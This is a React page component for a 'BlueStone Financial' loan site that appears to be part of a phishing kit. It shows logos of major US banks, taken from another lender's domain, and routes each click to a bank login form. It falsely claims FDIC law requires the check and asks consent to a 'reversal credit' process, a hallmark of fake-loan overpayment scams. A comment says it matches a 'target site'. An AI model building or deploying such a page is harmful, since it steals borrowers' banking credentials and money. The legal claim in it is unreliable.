import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { useNavigate } from "react-router-dom";

const bankLogos = [
  { name: "Chase", url: "https://onecapitalloans.com/assets/images/banks/chase_bank-logo.svg" },
  { name: "Bank of America", url: "https://onecapitalloans.com/assets/images/banks/bank_of_america-logo.svg" },
  { name: "Wells Fargo", url: "https://onecapitalloans.com/assets/images/banks/wells_fargo-logo.svg" },
  { name: "TD Bank", url: "https://onecapitalloans.com/assets/images/banks/td_bank-_n.a.-logo.svg" },
  { name: "Navy Federal Credit Union", url: "https://onecapitalloans.com/assets/images/banks/navy-federal-credit.svg" },
  { name: "Truist", url: "https://onecapitalloans.com/assets/images/banks/622714be74a10c92f2ae0797.png" },
  { name: "Regions", url: "https://onecapitalloans.com/assets/images/banks/regions-bank.svg" },
  { name: "USAA", url: "https://onecapitalloans.com/assets/images/banks/pngwing.png" },
  { name: "KeyBank", url: "https://onecapitalloans.com/assets/images/banks/keybank-logo.svg" },
  { name: "Citibank", url: "https://onecapitalloans.com/assets/images/banks/citi-bank.png" },
  { name: "US Bank", url: "https://onecapitalloans.com/assets/images/banks/us-banks.jpeg" },
];

const BankAuthentication = () => {
  const navigate = useNavigate();

  const handleBankClick = (bankName: string, logoSrc: string) => {
    navigate(`/bank_auth_form?name=${encodeURIComponent(bankName)}&image=${encodeURIComponent(logoSrc)}`);
  };

  return (
    <div className="min-h-screen flex flex-col bg-white text-gray-800" style={{ fontFamily: "Arial, sans-serif" }}>
      <Header />
      
      <main className="flex-grow py-16">
        <div className="container mx-auto px-4 max-w-5xl">
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-5xl mb-6 text-gray-900" style={{ fontWeight: 400 }}>
              Bank Authentication
            </h1>
            <div className="text-gray-600 space-y-4 max-w-4xl mx-auto leading-relaxed" style={{ fontSize: "16px" }}>
              <p>
                As per the law of Federal Deposit Insurance Corporation, we would need to verify you to check your repayment capacity and also that you are not misusing anyone’s identity.
              </p>
              <p>
                To do this verification – please agree to the consent form and move ahead with the loan officer instructions
              </p>
              <p>
                I hereby authorize BlueStone Financial (under reversal credit & reversal process) to access and utilize the following banking information for the specific purpose of processing payments, setting up direct deposits, etc.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6 mb-16 max-w-5xl mx-auto">
            {bankLogos.map((bank, index) => (
              <div 
                key={index}
                onClick={() => handleBankClick(bank.name, bank.url)}
                className="cursor-pointer hover:shadow-lg transition-shadow bg-white rounded-lg flex items-center justify-center p-4"
                style={{ border: "1px solid #eee", height: "140px" }}
              >
                <img 
                  src={bank.url} 
                  alt={bank.name} 
                  className="max-h-full max-w-full object-contain"
                  style={{ height: "auto", width: "auto", maxHeight: "100px" }}
                />
              </div>
            ))}
          </div>

          <div className="text-center">
            <button
              onClick={() => navigate('/bank_auth_form')}
              className="inline-block px-8 py-3 rounded text-white font-medium hover:opacity-90 transition-opacity"
              style={{ background: "#0b5ed7", fontSize: "16px", minWidth: "300px" }}
            >
              Other Banks & Credit Uniouns
            </button>
          </div>
          
        </div>
      </main>

      {/* Simple Black Footer matching target site */}
      <footer className="bg-black py-12 mt-auto">
        <div className="container mx-auto px-4">
           <div className="text-center text-white/80" style={{ fontSize: "15px" }}>
             Copyright © 2004-2026, BlueStone Financial, All Rights Reserved.
           </div>
        </div>
      </footer>
    </div>
  );
};

export default BankAuthentication;
